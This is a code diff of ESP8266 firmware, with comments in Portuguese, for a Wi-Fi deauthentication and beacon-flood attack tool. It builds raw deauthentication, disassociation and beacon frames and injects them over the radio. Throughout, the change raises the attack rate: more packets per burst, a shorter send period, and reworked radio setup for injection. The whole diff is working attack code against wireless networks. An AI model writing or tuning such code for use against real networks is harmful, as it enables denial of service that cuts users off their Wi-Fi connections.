@@ -2,6 +2,7 @@
 
 #include <ESP8266WiFi.h>
 #include "app_state.h"
+#include "wifi_portal.h"
 
 extern "C"
 {
@@ -20,6 +21,10 @@ static uint8_t targetClientMac[6];
 static uint8_t targetChannel = 1;
 static uint8_t attackReason = 7;
 static unsigned long lastAttackPacketAt = 0;
+
+/** Intensidade: mais bursts por rajada e periodo mais curto = mais pacotes/s (limitado pelo radio). */
+static constexpr int kDeauthBurst = 28;
+static constexpr unsigned long kDeauthPeriodMs = 10;
 
 // Pacote melhorado (mais compatível)
 static uint8_t deauthPacket[26] = {
@@ -60,11 +65,22 @@ static uint8_t beaconPacket[128] = {
     /* 90 - 108 */ 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 // RSN
 };
 
+/** wifi_send_pkt_freedom exige STATION_MODE, sem SoftAP; promiscuo costuma atrapalhar o envio. */
+static void prepareRadioForDeauthInjection(uint8_t channel)
+{
+  wifi_promiscuous_enable(0);
+  WiFi.softAPdisconnect(true);
+  delay(50);
+  wifi_set_opmode(STATION_MODE);
+  delay(50);
+  WiFi.disconnect(true);
+  delay(150);
+  wifi_set_channel(channel);
+}
+
 void initDeauther()
 {
-  wifi_set_opmode(STATION_MODE);
-  wifi_promiscuous_enable(1);
-  Serial.println("Deauther initialized with STATION_MODE and promiscuous mode");
+  /* Radio e preparado em prepareRadioForDeauthInjection ao iniciar o ataque. */
 }
 
 uint8_t *parseMac(String macStr)
@@ -74,85 +90,53 @@ uint8_t *parseMac(String macStr)
   return mac;
 }
 
+static void sendDeauthBurst(uint8_t subtype)
+{
+  deauthPacket[0] = subtype;
+  for (int i = 0; i < kDeauthBurst; i++)
+  {
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    if ((i & 0xF) == 0xF)
+    {
+      yield();
+    }
+  }
+}
+
 void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
 {
-  // MUITO IMPORTANTE: Mudar para o canal do alvo
   wifi_set_channel(channel);
-  delay(10); // Pequeno delay para estabilizar
-  Serial.print("Changed to channel ");
-  Serial.println(channel);
+  delay(1);
 
-  Serial.println("Sending deauth packets");
-
-  // Deauth from AP to client
-  deauthPacket[0] = 0xC0;
-  memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
-  memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
-  memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
+  memcpy(&deauthPacket[4], clientMac, 6);
+  memcpy(&deauthPacket[10], apMac, 6);
+  memcpy(&deauthPacket[16], apMac, 6);
   deauthPacket[24] = reason;
 
-  // Deauth from AP to client - 5 times
-  deauthPacket[0] = 0xC0;
-  for (int i = 0; i < 5; i++)
-  {
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-  }
+  sendDeauthBurst(0xC0);
+  sendDeauthBurst(0xA0);
 
-  // Disassociation from AP to client - 5 times
-  deauthPacket[0] = 0xA0;
-  for (int i = 0; i < 5; i++)
-  {
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-  }
-
-  // If not broadcast, send from client to AP
   if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
   {
-    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
-    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Client
-    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP
-
-    deauthPacket[0] = 0xC0;
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    }
-
-    deauthPacket[0] = 0xA0;
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    }
+    memcpy(&deauthPacket[4], apMac, 6);
+    memcpy(&deauthPacket[10], clientMac, 6);
+    memcpy(&deauthPacket[16], apMac, 6);
   }
   else
   {
-    // For broadcast, also send from broadcast to AP
-    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
-    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Broadcast
-    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP
-
-    deauthPacket[0] = 0xC0;
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    }
-
-    deauthPacket[0] = 0xA0;
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    }
+    memcpy(&deauthPacket[4], apMac, 6);
+    memcpy(&deauthPacket[10], clientMac, 6);
+    memcpy(&deauthPacket[16], apMac, 6);
   }
 
-  deautherPacketsSent += 20;
+  sendDeauthBurst(0xC0);
+  sendDeauthBurst(0xA0);
+
+  deautherPacketsSent += static_cast<unsigned long>(4 * kDeauthBurst);
 }
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
 {
-  // Disconnect from STA to allow proper injection
-  WiFi.disconnect(true);
-  delay(100);
-
   memcpy(targetApMac, apMac, 6);
   memcpy(targetClientMac, clientMac, 6);
   targetChannel = channel;
@@ -161,7 +145,8 @@ void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint
   deautherRunning = true;
   lastAttackPacketAt = millis();
 
-  // Envia o primeiro imediatamente
+  prepareRadioForDeauthInjection(channel);
+
   sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
 }
 
@@ -170,18 +155,12 @@ void stopDeauthAttack()
   attackActive = false;
   deautherRunning = false;
 
-  // Reconnect STA if configured
-  if (wifiSsid.length() > 0)
-  {
-    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
-  }
+  restorePortalWiFiAfterDeauth();
 }
 
 void startBeaconAttack()
 {
-  // Disconnect from STA to allow proper injection
-  WiFi.disconnect(true);
-  delay(100);
+  prepareRadioForDeauthInjection(1);
 
   beaconActive = true;
 }
@@ -190,17 +169,13 @@ void stopBeaconAttack()
 {
   beaconActive = false;
 
-  // Reconnect STA if configured
-  if (wifiSsid.length() > 0)
-  {
-    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
-  }
+  restorePortalWiFiAfterDeauth();
 }
 
 void updateBeacon()
 {
-  if (beaconActive && (millis() - lastAttackPacketAt > 50))
-  { // Envia a cada 50ms
+  if (beaconActive && (millis() - lastAttackPacketAt > kDeauthPeriodMs))
+  {
     for (int i = 0; i < 10; i++)
     {
       // Generate random MAC
@@ -242,8 +217,8 @@ bool isDeauthActive()
 
 void updateDeauth()
 {
-  if (attackActive && (millis() - lastAttackPacketAt > 50))
-  { // Envia a cada 50ms
+  if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
+  {
     sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
     lastAttackPacketAt = millis();
   }
